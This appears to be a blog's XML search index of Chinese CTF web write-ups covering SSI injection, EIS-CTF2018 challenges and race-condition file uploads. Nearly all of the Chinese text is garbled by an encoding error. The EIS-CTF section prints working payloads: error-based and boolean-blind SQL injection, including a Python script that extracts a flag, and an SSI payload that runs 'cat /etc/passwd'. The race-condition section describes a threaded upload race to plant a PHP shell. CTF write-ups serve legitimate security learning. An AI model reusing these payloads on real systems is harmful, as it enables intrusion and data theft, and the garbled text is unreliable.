.shtml.stmÔºå.shtmÂíå.shtmlÁöÑÈ°µÈù¢ÊòØÂê¶Â≠òÂú®Êñá‰ª∂ÂêéÁºÄÂêçÊòØÁî®Êù•Ë°®ÊòéÁΩëÈ°µÊñá‰ª∂ÊòØÂê¶ÂåÖÂê´SSIÊåá‰ª§ÁöÑÔºåÂõ†Ê≠§Â¶ÇÊûúËØ•ÁΩëÁ´ô‰ΩøÁî®‰∫Ü.shtmlÊñá‰ª∂ÔºåÈÇ£ËØ¥ÊòéËØ•ÁΩëÁ´ôÊîØÊåÅSSIÊåá‰ª§„ÄÇÁÑ∂ËÄå.shtmlÂêéÁºÄÂêçÂπ∂ÈùûÊòØÂº∫Âà∂ËßÑÂÆöÁöÑÔºåÂõ†Ê≠§Â¶ÇÊûúÊ≤°ÊúâÂèëÁé∞‰ªª‰Ωï.shtmlÊñá‰ª∂ÔºåÂπ∂‰∏çÊÑèÂë≥ÁùÄÁõÆÊ†áÁΩëÁ´ôÊ≤°ÊúâÂèóÂà∞SSIÊ≥®ÂÖ•ÊîªÂáªÁöÑÂèØËÉΩ„ÄÇ SSIÈò≤Êä§ÈªòËÆ§apache‰∏çÂºÄÂêØssiÔºåssiËøôÁßçÊäÄÊúØÂ∑≤ÁªèÊØîËæÉÂ∞ëÁî®‰∫Ü„ÄÇÂ¶ÇÊûúÂ∫îÁî®Ê≤°Êúâ‰ΩøÁî®Âà∞ssiÔºåÂÖ≥Èó≠ÊúçÂä°Âô®ÂØπssiÁöÑÊîØÊåÅÂç≥ÂèØ„ÄÇ ÂèÇËÄÉÔºöhttps://www.cnblogs.com/jokermoon/p/6708691.html]]></content>
      <tags>
        <tag>Ê∏óÈÄèÊîªÈò≤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EIS-CTF2018]]></title>
    <url>%2F2018%2F11%2F16%2F2018%20%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[simpleBBSÈ¢òÁõÆÔºöhttp://bbs.sec.zju.edu.cn/ ËøõÂÖ•ÁΩëÁ´ô Ê≥®ÂÜå ÁôªÂΩï È¢òÁõÆ‰∏≠Ê≤°Êúâ‰ªª‰ΩïÊèêÁ§∫ÔºåÂè™ËØ¥ÊòØÁÆÄÂçïÁöÑbbsÔºàËÆ∫ÂùõÔºâÂêÑÁßçÊìç‰ΩúËΩÆÁï™‰∏äÈòµxssÂêÑÁßçÂºπÔºåÊ≤°ÂçµÁî®ÔºåÁîöËá≥Âè≥ËæπÊúâ‰∏™Êñá‰ª∂‰∏ä‰º†ÊµãËØïÔºå‰ª•‰∏∫ÊòØÊñá‰ª∂‰∏ä‰º†ÔºåÁªìÊûú‰πüÊ≤°ÊâæÂà∞‰∏ä‰º†ÁÇπÔºåÂ•ΩÂêßÊîæÂºÉ‰∫ÜÔºå ÈÇ£ÊòØ‰∏çÂèØËÉΩÁöÑÔºå‰∏ÄÁøªpyÔºåfuzzÔºåÊ≥®ÂÜåÁöÑÊó∂ÂÄô‰ºöÊä•ÈîôÔºåËØ¥ÊòéÊ≥®ÂÜåÁöÑÊó∂ÂÄôÈúÄË¶ÅÂä†‰∏Ä‰∏™ÂèÇÊï∞snÔºåÊäìÂåÖÊ∑ªÂä†snÂèÇÊï∞ÔºåÊ≥®ÂÜåÊàêÂäü„ÄÇ‰∏çËøáÁªôÊàëÊúÄÂ§ßÁöÑÂêØÂèëÊòØËøô‰∏™È°µÈù¢Êä•ÈîôÔºåÊï∞ÊçÆÂ∫ìÔºåÈöæÈÅìÊöóÁ§∫ÁùÄ Êï∞ÊçÆÂ∫ìÊä•ÈîôÔºåÊ≥®ÂÖ•ÔºüËØïËØï Ê≥®ÂÜåÈ°µÈù¢Áøª‰∫ëË¶ÜÈõ®ÁöÑfuzzÔºåÂ•ΩÂêßÂçïÂºïÂè∑ËøáÊª§‰∫ÜÔºåÊàëÊ≥®ÂÖ•‰Ω†‰∏™Ëû∫ÊóãÂ§ßÈî§Â≠ê„ÄÇÔºüÔºü‰∏çÂØπÔºåÊàëÁôªÂΩïÈ°µÈù¢Áªô‰∏™ÂçïÂºïÂè∑Âë¢ÔºåÁªèËøá‰∏ÄÁøªÊµãËØïÔºåÂøÖÈ°ªË¶ÅÂ∑≤ÁªèÊ≥®ÂÜåÁöÑË¥¶Âè∑Âä†ÂçïÂºïÂè∑ÊâçÊúâÊïà„ÄÇÂ•ΩÁöÑ ÊµãËØïÂºÄÂßãÔºåË¥¶Âè∑ username=xiaozhupeiqi1‚Äô&amp;password123456ËøôÊòØÂï•ÔºüÔºüÊï∞ÊçÆÂ∫ìÊä•ÈîôÔºüÂ•Ω‰∫ÜÔºå‰∫åËØù‰∏çËØ¥Â∞±ÊòØÊä•ÈîôÊ≥®ÂÖ•ÔºåflagÂá∫Êù•‰∫ÜÔºåhiahiahiaÔºåÊèê‰∫§Ôºå‰πîÂæ∑È∫ªË¢ãÔºüÔºüflagÂíã‰∏çÂÖ®ÔºåÂà´ÊãÖÂøÉÊç¢‰∏™ÂáΩÊï∞username=aaa‚Äô and 1=updatexml(1,concat(0x3a,(select mid(flag,32,32) from flag) ,0x3a),1)‚ÄìOK‰∫ÜÂâ©‰∏ãÁöÑÂá†‰Ωç‰πüÂá∫Êù•‰∫Ü„ÄÇÊ≠§È¢ò ÂÆåÔºÅ SimpleExtensionExplorerInjectionËØ∑ÁúãÈ¢òÁõÆÔºåÈáçÁÇπ xxeÔºåÂêéÈù¢ÊòØ/flagÔºåÂ∞±ÊòØflagË∑ØÂæÑÔºå ÂºÄÂ±Ä‰∏§‰∏™Ê°ÜÔºåÊäìÂåÖ! Êàë*Ôºü‰∏çÊòØxmlÂêóÔºå‰Ω†ÁªôÊàëÂèë‰∏™jsonÊ†ºÂºèÂåÖÔºå‰Ω†ÊÉ≥ÂÅöÁà™Â≠êÔºü‰∏çÂØπÔºåËøôÊòØctfÔºåËøôÂæàÊ≠£Â∏∏Ôºå‰Ω©Â•áËÄÅÂì•Áªô‰Ω†‰º†‰∏™xmlÊ†ºÂºèËØïËØïÊ∞¥Ôºå ÁâõÁöÆÔºåxml Êï∞ÊçÆÂèØ‰ª•‰º†ËæìÔºåÈÇ£‰πàÊØîËæÉÂÆπÊòìÂøΩËßÜÁöÑÁÇπÊù•‰∫ÜÔºå‰∏â‰∏™ÁÆ≠Â§¥ÁöÑÂú∞ÊñπÂéüÊú¨ÊòØjson,Êó¢ÁÑ∂Ë¶Å‰º†ËæìxmlÔºå‰∏ÄÂÆöË¶Å‰øÆÊîπÊàêxmlÔºåÂê¶Âàô‰Ω†ÂÅöÂá∫Êù•ÊàëÂêÉ*ÔºåÁÑ∂Âêéxxe,‰∏ç‰ºöÁöÑËØ∑Ëá™Ë°åÂèÇËÄÉÊàëÁöÑÂçöÂÆ¢xxeÔºåÊù•‰∏™payload ÂåÖÔºåÂÆåÁªìÔºÅ SimpleServerInjection ÈáçÁÇπÔºåSSI ÊòØÊúçÂä°Âô®Ê≥®ÂÖ•ÔºåÊãìÂ±ï‰∏ãÔºåsstiÊòØÊúçÂä°Âô®Ê®°ÁâàÊ≥®ÂÖ•ÔºåÂêçÂ≠óÂæàÂÉèÔºåÂà©Áî®ÊñπÂºèÊúâÂå∫Âà´ÔºåÁÑ∂ÂêéflagÂú®ÂΩìÂâçÁõÆÂΩï‰∏ãÔºå ËøôÈÅìCTFÈ¢òËøòÊòØÊØîËæÉÁÆÄÂçïÔºå‰ΩÜÊòØÈúÄË¶ÅÁÇπÔºåÁÇπ‰∏çÂØπÊâìÊ≠ª‰πüÂÅö‰∏çÂá∫Êù•ÔºåÊÉ≥Â§çÊùÇÁöÑËØù Êõ¥ÂÅö‰∏çÂá∫Êù•„ÄÇ payload name=&lt;!--%23exec cmd=&quot;cat /etc/passwd&quot;--&gt;ËøôÈáåÊúâ‰∏™Â∞èÁÇπÔºåÂ¶ÇÊûúÊòØ#ÊµèËßàÂô®‰ºöËá™Âä®ÂΩìÊàêÊ≥®ÈáäÔºå‰∏ç‰ºöËß£ÊûêÂèëÂåÖÔºåÊâÄ‰ª•ËøôÈáåÁªôÁºñÁ†Å%23‰ΩÜÊòØÂπ∂Ê≤°ÂçµÁî®Ôºå‰∏ÄÂºÄÂßã‰ª•‰∏∫‰ºöËøáÊª§‰∫Ü‰∏úË•øÔºå‰ΩÜÊòØÁúã‰∏çÂá∫Êù•Âì™ËøáÊª§‰∫ÜÔºåËøô‰∏™Êó∂ÂÄôÂ∞±Ë¶ÅÂ§öÂ∞ùËØïÂëΩ‰ª§ÔºåÊØïÁ´üssiÊúâÈÇ£‰πàÂ§öÂëΩ‰ª§Â∞ùËØïËøáÂêé‰ΩøÁî® name=&lt;!--%23include virtual=&quot;flag&quot;--&gt; SimpleBlogÈ¢òÁõÆÔºåÁÆÄÂçïÁöÑblog,ÁÑ∂ÂêéÂú®classesÁªôÊèêÁ§∫ËØ¥ÊòØ‰∫åÊ¨°Ê≥®ÂÖ•Ôºå‰∏ÄÁøªÂ∞ùËØï‰πãÂêéÊó†ÊûúÔºåÊúÄÂêéÂ§ß‰Ω¨ÁªôÁöÑÊÄùË∑ØÔºåÊ≥®ÊÑè‰∏ªÈ°µÁöÑÊèêÁ§∫Ê≥®ÊÑè0ÂàÜÔºåfinal examÊèê‰∫§Á≠îÂç∑‰ºöÈöèÊú∫Áªô‰∏Ä‰∏™ÊàêÁª©ÔºåÊó¢ÁÑ∂ËØ¥‰∫åÊ¨°Ê≥®ÂÖ•Ôºå‰ºö‰∏ç‰ºöÊòØÁúãÊàêÁª©ÁöÑÊó∂ÂÄô‰ºöÊääÁî®Êà∑ÂêçÂï•ÁöÑ‰ª£ÂÖ•Âà∞Êï∞ÊçÆÂ∫ì‰∏≠ÔºåÂõ†‰∏∫Êèê‰∫§Á≠îÂç∑ÂàÜÊï∞ÊèíÂÖ•Âà∞Êï∞ÊçÆÂ∫ìÔºåËøôÈáåÂèØËÉΩÈÄ†Êàê‰∫åÊ¨°Ê≥®ÂÖ•ÔºåÂç≥ÁÑ∂ËøôÊ†∑ÈÇ£Ê≥®ÂÖ•ÁÇπÂ∞±Âú®Áî®Êà∑Âêç‰∏äÈù¢‰∫ÜÔºå‰∏çÊñ≠Ê≥®ÂÜåÊü•ÁúãÊòØÂê¶Á≠â‰∫é0ÔºåÂêéÊù•ÁúãwpÊôìÂæóÔºåÂΩìÊàêÁª©‰∏∫0Êó∂ËØ¥ÊòéÈÄªËæëÈîôËØØÔºå‰∏ç‰∏∫0ÂàôÈÄªËæëÊ≠£Â∏∏„ÄÇ ÁÑ∂ÂêéÊ≥®ÂÜå Ë¥¶Âè∑‰∏∫ 1‚Äô or 1=1 or ‚Äò Ë¥¶Âè∑ËøôÈáåÊúâÂá†‰∏™ÁÇπÁùÄÈáçËØ¥‰∏Ä‰∏ã ÂâçÈù¢ÁöÑ1Ë¶ÅÂçïÂºïÂè∑Èó≠ÂêàÔºåËøôÂè•ÈÄªËæëË¥¶Âè∑Êúâ‰∏â‰∏™ËØ≠Âè•Ë¶ÅÂà§Êñ≠ÔºåÁ¨¨‰∏Ä‰∏™1‚Äô Êï∞ÊçÆÂ∫ì‰∏≠ÂèØËÉΩË¶ÅÊü•ËØ¢Âï•‰∏çÊ∏ÖÊ•öÂêéÁ´Ø‰ª£Á†ÅÔºåËøôÈáåÂà§Êñ≠ÊòØÈîôÁöÑÔºåor 1=1 Ëøô‰∏™ËØ≠Âè•ÊòØÂØπÁöÑÔºå or‚Äô Èó≠ÂêàËØ≠Âè•ËøôÂè•‰πüÈÄªËæë‰πüÊòØÈîôÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ orÂà§Êñ≠Âè™Ë¶ÅÊòØÂØπÁöÑ ÈÇ£‰πàÂàÜÊï∞Êü•ËØ¢ÈÇ£ÈáåÂ∞±‰ºöÊòØÊúâÂàÜÔºåÂê¶ÂàôÂ∞±ÊòØ0ÂàÜ„ÄÇ Áé∞Âú®Â∞±ÂèØÂÜôËÑöÊú¨ËøõË°åÊ£ÄÊµãÔºåÈ¶ñÂÖàÁ°ÆÂÆöÂ•ΩËá™Â∑±ÁöÑ Ê≥®ÂÖ•ËØ≠Âè•ÔºåËøôÈáåÊòØÊó†Ê≥ïÈÄöËøáÂõûÊòæÊù•Ê≥®ÂÖ•ÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ÈÄöËøáÂ∏ÉÂ∞îÁõ≤Ê≥®ÂÜôËÑöÊú¨„ÄÇ ËØ≠Âè• zpq‚Äô or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1 or ‚Äò Êü•ÁúãÊïàÊûú ËØ≠Âè• zpq‚Äô or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1000 or ‚Äò ËøôÂè• ËÇØÂÆö‰∏∫ÈîôÔºåÂõ†‰∏∫asciiÁ†Å‰∏çÂèØËÉΩÂ§ß‰∫é1000 ÂèØ‰ª•ÁúãÂà∞ ËøîÂõû‰∏∫0ËØ¥ÊòéÊòØÈîôËØØÁöÑÔºåËØ≠Âè•Â∑≤ÁªèÂÆåÊàêÊé•‰∏ãÊù•Â∞±ÂÜô‰∏™ËÑöÊú¨Ë∑ëÂá∫flag„ÄÇ import requests import re headers = { &apos;Connection&apos;: &apos;close&apos;, }//Èò≤Â§öÊ¨°ËÆøÈóÆÊñ≠ÂºÄËøûÊé• flag=&quot;&quot; for i in range(1,32): for nmb in range(32,126): payload={&apos;username&apos;:&quot;zpq888&apos; or ascii(substr((select flag from flag limit 0,1),%s,1))=%s or&apos;&quot;%(i,nmb),&apos;password&apos;:&quot;123&quot;} s=requests.Session() url_reg=&apos;http://210.32.4.20/register.php&apos; r=s.post(url_reg,data=payload,headers=headers) url_log=&apos;http://210.32.4.20/login.php&apos; r=s.post(url_log,data=payload,headers=headers) url_ans=&apos;http://210.32.4.20/answer.php&apos; select={&apos;1.a&apos;:&apos;on&apos;} r=s.post(url_ans,data=select,headers=headers) result=r.content[2074:2075] if int(result)!=0: flag=flag+chr(nmb) print flag break ÂçïÁ∫øÁ®ãÂ§™ÊÖ¢‰∏çË∑ë‰∫ÜÔºÅ]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF‰∏≠ÁöÑÊù°‰ª∂Á´û‰∫âÊºèÊ¥û]]></title>
    <url>%2F2018%2F11%2F15%2F%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Êù°‰ª∂Á´û‰∫âÊòØÊ≤ÉÁâπÔºüÊï≤ÈªëÊùøÔºåÂÆö‰πâÔºöÁ´û‰∫âÊù°‰ª∂ÂèëÁîüÂú®Â§ö‰∏™Á∫øÁ®ãÂêåÊó∂ËÆøÈóÆÂêå‰∏Ä‰∏™ÂÖ±‰∫´‰ª£Á†Å„ÄÅÂèòÈáè„ÄÅÊñá‰ª∂Á≠âÊ≤°ÊúâËøõË°åÈîÅÊìç‰ΩúÊàñËÄÖÂêåÊ≠•Êìç‰ΩúÁöÑÂú∫ÊôØ‰∏≠„ÄÇ ÂºÄÂèëËÄÖÂú®ËøõË°å‰ª£Á†ÅÂºÄÂèëÊó∂Â∏∏Â∏∏ÂÄæÂêë‰∫éËÆ§‰∏∫‰ª£Á†Å‰ºö‰ª•Á∫øÊÄßÁöÑÊñπÂºèÊâßË°åÔºåËÄå‰∏î‰ªñ‰ª¨ÂøΩËßÜ‰∫ÜÂπ∂Ë°åÊúçÂä°Âô®‰ºöÂπ∂ÂèëÊâßË°åÂ§ö‰∏™Á∫øÁ®ãÔºåËøôÂ∞±‰ºöÂØºËá¥ÊÑèÊÉ≥‰∏çÂà∞ÁöÑÁªìÊûú„ÄÇÁ∫øÁ®ãÂêåÊ≠•Êú∫Âà∂Á°Æ‰øù‰∏§‰∏™Âèä‰ª•‰∏äÁöÑÂπ∂ÂèëËøõÁ®ãÊàñÁ∫øÁ®ã‰∏çÂêåÊó∂ÊâßË°åÊüê‰∫õÁâπÂÆöÁöÑÁ®ãÂ∫èÊÆµÔºå‰πüË¢´Áß∞‰πã‰∏∫‰∏¥ÁïåÂå∫Ôºàcritical sectionÔºâÔºåÂ¶ÇÊûúÊ≤°ÊúâÂ∫îÁî®Â•ΩÂêåÊ≠•ÊäÄÊúØÂàô‰ºöÂèëÁîü‚ÄúÁ´û‰∫âÊù°‰ª∂‚ÄùÈóÆÈ¢ò„ÄÇ ÂΩ¢Ë±°ÂÆû‰æã#ÊäΩË±°ÊàêÂõõ‰∏™Â≠óÔºåÊé™Êâã‰∏çÂèäÔºÅÔºÅÔºÅ Âà©Áî®Â§öÁ∫øÁ®ãÂπ∂ÂèëÂéªÊâßË°åÂêå‰∏Ä‰∏™Êìç‰ΩúËøõÁ®ãÔºåÊúçÂä°Âô®Êó†Ê≥ïÊàñËÄÖÊ≤°ÊúâÂ§ÑÁêÜÁ®ãÂ∫èÔºåÂØºËá¥Â§ÑÁêÜÈ´òÂπ∂ÂèëÁöÑÁ∫øÁ®ãÊú™ËÉΩÂêåÊ≠•Â•ΩÊâÄÊúâËØ∑Ê±ÇÔºåÂØºËá¥ËØ∑Ê±Ç‰∏éËØ∑Ê±Ç‰πãÈó¥‰∫ßÁîüÁ≠âÂæÖÊó∂Âá∫Áé∞ÈÄªËæëÁº∫Èô∑„ÄÇÂá∫Áé∞ÊÑèÊÉ≥‰∏çÂà∞ÁöÑÁªìÊûúÔºåÊé™Êâã‰∏çÂèäÂ∫îÊé•‰∏çÊöá‰∫∫Â±±‰∫∫‚Ä¶Âí≥Âí≥ÔºåÂèçÂ∫î‰∏çËøáÊù•Â∞±Âá∫Èîô„ÄÇ ËØ•ÊºèÊ¥û‰∏ÄËà¨Âá∫Áé∞Âú®‰∏éÊï∞ÊçÆÂ∫ìÁ≥ªÁªüÈ¢ëÁπÅ‰∫§‰∫íÁöÑ‰ΩçÁΩÆÔºå‰æãÂ¶ÇÈáëÈ¢ùÂêåÊ≠•„ÄÅÊîØ‰ªòÁ≠âËæÉÊïèÊÑüÊìç‰ΩúÂ§Ñ„ÄÇÂè¶Â§ñÊù°‰ª∂Á´û‰∫âÊºèÊ¥û‰πü‰ºöÂá∫Áé∞Âú®ÂÖ∂‰ªñ‰ΩçÁΩÆÔºå‰æãÂ¶ÇÊñá‰ª∂ÁöÑÊìç‰ΩúÂ§ÑÁêÜÁ≠â„ÄÇ Áªô‰∏§‰∏™‰æãÂ≠êÂ•ΩÂ•ΩÊ∂àÂåñÊ∂àÂåñ„ÄÇ ‰æã1ÔºöÈáëÈ¢ùÊèêÁé∞ ÂÅáËÆæÁé∞Êúâ‰∏Ä‰∏™Áî®Êà∑Âú®Á≥ªÁªü‰∏≠ÂÖ±Êúâ2000ÂÖÉÂèØ‰ª•ÊèêÁé∞Ôºå‰ªñÊÉ≥ÂÖ®ÈÉ®ÊèêÁé∞„ÄÇ‰∫éÊòØËØ•Áî®Êà∑ÂêåÊó∂ÂèëËµ∑‰∏§Ê¨°ÊèêÁé∞ËØ∑Ê±ÇÔºåÁ¨¨‰∏ÄÊ¨°Êèê‰∫§ËØ∑Ê±ÇÊèêÁé∞2000ÂÖÉÔºåÁ≥ªÁªüÂ∑≤ÁªèÂàõÂª∫‰∫ÜÊèêÁé∞ËÆ¢Âçï‰ΩÜËøòÊú™Êù•ÂæóÂèä‰øÆÊîπËØ•Áî®Êà∑Ââ©‰ΩôÈáëÈ¢ùÔºåÊ≠§Êó∂Á¨¨‰∫åÊ¨°ÊèêÁé∞ËØ∑Ê±ÇÂêåÊ†∑ÊòØÊèêÁé∞2000ÂÖÉÔºå‰∫éÊòØÁ®ãÂ∫èÂú®ËøòÊú™‰øÆÊîπÂÆå‰∏ä‰∏ÄÊ¨°ËØ∑Ê±ÇÂêéÁöÑ‰ΩôÈ¢ùÂâçÂ∞±ËøõË°å‰∫Ü‰ΩôÈ¢ùÂà§Êñ≠ÔºåÊòæÁÑ∂Â¶ÇÊûúËøôÈáå‰ΩôÈ¢ùÂà§Êñ≠ÈÄüÂ∫¶Âø´‰∫é‰∏ä‰∏ÄÊ¨°‰ΩôÈ¢ù‰øÆÊîπÈÄüÂ∫¶ÔºåÂ∞Ü‰ºö‰∫ßÁîüÊàêÂäüÊèêÁé∞ÁöÑ‰∏§Ê¨°ËÆ¢ÂçïÔºåËÄåÊï∞ÊçÆÂ∫ì‰∏≠‰ΩôÈ¢ù‰πüÂ∞ÜÂèò‰∏∫-2000„ÄÇËÄåËøô‰∫ßÁîüÁöÑÂêéÊûúÂ∞Ü‰ºöÊòØÂπ≥Âè∞Â§öÂêëËØ•Áî®Êà∑‰ªòÂá∫2000ÂÖÉ„ÄÇ ‰æã2ÔºöÂÖàÂ≠òÂÇ®Êñá‰ª∂ÔºåÂÜçÂà§Êñ≠ÊòØÂê¶ÂêàÊ≥ïÔºåÁÑ∂ÂêéÂÜçÂà†Èô§„ÄÇ È¶ñÂÖàÂ∞ÜÊñá‰ª∂‰∏ä‰º†Âà∞ÊúçÂä°Âô®ÔºåÁÑ∂ÂêéÊ£ÄÊµãÊñá‰ª∂ÂêéÁºÄÂêçÔºåÂ¶ÇÊûú‰∏çÁ¨¶ÂêàÊù°‰ª∂ÔºåÂ∞±Âà†ÊéâÔºåÂÖ∏ÂûãÁöÑ‚ÄúÂºïÁãºÂÖ•ÂÆ§‚ÄùÊîªÂáªÔºöÈ¶ñÂÖà‰∏ä‰º†‰∏Ä‰∏™phpÊñá‰ª∂ÂΩìÁÑ∂Ëøô‰∏™Êñá‰ª∂‰ºöË¢´Á´ãÈ©¨Âà†ÊéâÔºåÊâÄ‰ª•Êàë‰ª¨‰ΩøÁî®Â§öÁ∫øÁ®ãÂπ∂ÂèëÁöÑËÆøÈóÆ‰∏ä‰º†ÁöÑÊñá‰ª∂ÔºåÊÄª‰ºöÊúâ‰∏ÄÊ¨°Âú®‰∏ä‰º†Êñá‰ª∂Âà∞Âà†Èô§Êñá‰ª∂Ëøô‰∏™Êó∂Èó¥ÊÆµÂÜÖËÆøÈóÆÂà∞‰∏ä‰º†ÁöÑphpÊñá‰ª∂Ôºå‰∏ÄÊó¶Êàë‰ª¨ÊàêÂäüËÆøÈóÆÂà∞‰∫Ü‰∏ä‰º†ÁöÑÊñá‰ª∂ÔºåÈÇ£‰πàÂÆÉÂ∞±‰ºöÂêëÊúçÂä°Âô®ÂÜô‰∏Ä‰∏™shell„ÄÇ ‰πå‰∫ëÂÆû‰æãÔºöhttp://wooyun.jozxing.cc/static/bugs/wooyun-2014-049794.html ‰πå‰∫ë‰∫∫Ê∞ëÂ∏ÅÂ•óÁé∞Ôºöhttp://wooyun.jozxing.cc/static/bugs/wooyun-2015-099622.html CTFÂÆû‰æãhttps://blog.csdn.net/iamsongyu/article/details/83346029 //ItshopËæ£Êù°‰πãÁéã Áü•ËØÜÁÇπ1.Êù°‰ª∂Á´û‰∫â 2.Êï∞ÊçÆÊ∫¢Âá∫Êï∞ÊçÆÊ∫¢Âá∫ÈáçÁÇπ‰∏ÄÂè•ËØùÔºöÊàë‰ª¨ËæìÂÖ•ÁöÑÊòØ‰ªΩÊï∞ÔºåÂêéÂè∞ËÇØÂÆöË¶ÅÊü•ËØ¢Êï∞ÊçÆÂ∫ì‰∏≠Êàë‰ª¨ÁöÑÂ§ßËæ£Êù°Êï∞ÁõÆ‰π¶Âê¶Á¨¶ÂêàÊù°‰ª∂ÔºåÂç≥ÊòØÂê¶Â§ß‰∫é‰ªΩÊï∞*5ÔºåÊâç‰ºöÁªôÊàë‰ª¨Áõ∏Â∫îÁöÑËæ£Êù°‰πãÁéã„ÄÇÊàë‰ª¨ÁöÑÁõÆÁöÑÊòØÊï∞ÊçÆÂ∫ìÂà§Êñ≠ÂèØ‰ª•ËøáÔºå‰ΩÜÊòØÂêéÂè∞‰πüÂæóÁªôÊàë‰ª¨Ë∂≥Â§üÁöÑËæ£Êù°‰πãÁéãÔºåÊÄùË∑ØÊòØ‰ΩøÁî®Êï¥Êï∞Ê∫¢Âá∫Ê¨∫È™óÊï∞ÊçÆÂ∫ìÔºåÔºàÈáç‰∏≠Ôºâ‰ΩøÂæóÊàë‰ª¨ËØ∑Ê±ÇÁöÑÊï∞Â≠óÂú®ÊúçÂä°Âô®ÁúãÊù•Â∞±ÊòØ1ÂàÜËæ£Êù°‰πãÁéãÔºåËÄåÂÆûÈôÖ‰∏äÊòØÂæàÂ§ö„ÄÇÔºà‰πãÈáçÔºÅÔºâ ctfÈ¢òÁõÆÔºöhttp://119.23.73.3:5006/web2/index2.php ÔºàÁªÉ‰π†Ôºâ È¶ñÂÖàËøõÂÖ•CTFÂú∞ÂùÄÔºåËßÇÂØüÂèëÁé∞ÔºåÁΩëÂùÄ‰∏∫inde2.phpÔºåÊ≠£Â∏∏Êù•ËØ¥Â∫îÊòØindex.phpÔºåËÆøÈóÆindex.phpÂèëÁé∞Ëá™Âä®Ë∑≥ËΩ¨ inde2.phpÊäìÂåÖÊà™ÂåÖÔºåËøõÂÖ• uploadsomething.phpÔºåÂèëÁé∞Â∫îËØ•ÊòØ‰∏™‰∏ä‰º†È°µÈù¢ÔºåÁ¨¨‰∏Ä‰∏™Ê°Ü‰∏∫‰∏ä‰º†Êñá‰ª∂ÂêçÔºåÁ¨¨‰∫å‰∏™‰∏∫Êñá‰ª∂ÂÜÖÂÆπÔºå‰∏ä‰º†1.php ÔºåËøîÂõûË∑ØÂæÑ Êü•ÁúãÂá≠Êàë‰∏ì‰∏öÂÖ´Á∫ßÁöÑËã±ËØ≠Ê∞¥Âπ≥ÔºåËøôÊÑèÊÄùÂ∫îËØ•ÊòØÂ§™ÊÖ¢‰∫ÜÔºå‰∫éÊòØËÅ™ÊòéÁöÑ‰Ω†ÊÉ≥Âà∞ÁöÑÊù°‰ª∂Á´û‰∫âÊºèÊ¥ûÔºåËøÖÈÄü‰∏ä‰º†ËøÖÈÄüËÆøÈóÆ„ÄÇOKÔºå‰ΩøÁî®burp intruder Ê®°Âùó ÁàÜÁ†¥‰∏ä‰º†ÔºåÁÑ∂ÂêéËÆøÈóÆ„ÄÇ ‰∫éÊòØÔºåÂºÄÂßãÔºå ÂàÜÂà´ÊäìÂèñ‰∏§‰∏™ÂåÖÂèëÈÄÅintruderÁ¨¨‰∏Ä‰∏™ÂåÖÁΩëÂùÄÔºöhttp://119.23.73.3:5006/web2/uploadsomething.php?filename=1.php&amp;content=Á¨¨‰∫å‰∏™ÂåÖÁΩëÂùÄÔºöhttp://119.23.73.3:5006/web2/uploads/c2a54d18d324f0c9b33b29243f77d3a45b5f9463/1.php Ë∞ÉÊï¥Ê≤°ÊúâÂ≠óÂÖ∏ÁöÑÁàÜÁ†¥Ôºå‰∏çÊñ≠ÂèëÂåÖÔºå ÁÑ∂ÂêéËÆæÁΩÆÂèëÈÄÅ‰∏âÂçÉ‰∏™Êï∞ÊçÆÂåÖÔºåÁÑ∂ÂêéËÆæÁΩÆÁ∫øÁ®ãË∞ÉËá≥50 Á¨¨‰∏Ä‰∏™ÂåÖ‰∏∫‰ª•50Á∫øÁ®ãËøÖÈÄü‰∏ä‰º†‰∏âÂçÉÊ¨°ÔºåÁ¨¨‰∫å‰∏™ÂåÖ‰∏∫‰ª•50Á∫øÁ®ãËøÖÈÄüËÆøÈóÆ‰∏âÂçÉÊ¨°ÔºåÂè™Ë¶ÅÈÄüÂ∫¶Â§üÂø´Â∞±ÂèØ‰ª•ËÆøÈóÆÂà∞„ÄÇÁÑ∂ÂêéÂºÄÂßãÁàÜÁ†¥ÊàêÂäüÂæóÂà∞flagÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞‰πü‰∏çÊòØÁôæÂàÜÁôæÂèØ‰ª•ÂæóÂà∞flagÔºåÂ≠òÂú®Á´û‰∫âÔºå Èò≤Âæ°ÂØπ‰∫éÊï∞ÊçÆÂ∫ìÁöÑÊìç‰ΩúÔºåÊ≠£ÁâåÁöÑÊñπÊ≥ïÊòØËÆæÁΩÆÈîÅ ÂØπ‰∫éÊñá‰ª∂‰∏ä‰º†Ôºå‰∏ÄÂÆöË¶ÅÁªèËøáÂÖÖÂàÜÂÆåÊï¥ÁöÑÊ£ÄÊü•‰πãÂêéÂÜç‰∏ä‰º†ËÄå‰∏çÊòØÂÖà‰∏ä‰º†Âú®Ëæ®Âà´„ÄÇ ÂèÇËÄÉÔºöhttps://blog.csdn.net/ivalue/article/details/81412494ÂèÇËÄÉÔºöhttps://www.0dayhack.com/post-666.html]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-WEBÁü•ËØÜÁÇπ‰øùÂ≠ò]]></title>
    <url>%2F2018%2F11%2F14%2FCTF-web%2F</url>
    <content type="text"><![CDATA[nginx ÈÖçÁΩÆ‰∏çÂΩìÂØºËá¥ÁõÆÂΩïÈÅçÂéÜ‰∏ãËΩΩÊºèÊ¥ûhttp://www.cnblogs.com/Mrsm1th/p/6600876.html php:input‰ª£Á†ÅÊâßË°å‰ª•Âèäphp://filterËØªÂèñÊ∫êÁ†Åhttps://www.ichunqiu.com/writeup/detail/481 ‰∏ÄÈÅìpythonÁÆÄÂçïÁºñÂÜô‚Äì‰øùÊåÅsessionÊÉÖÂÜµ‰∏ãÁàÜÁ†¥https://www.ichunqiu.com/writeup/detail/345 ÈôÑËÑöÊú¨ import requests url=&apos;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=ea&apos; 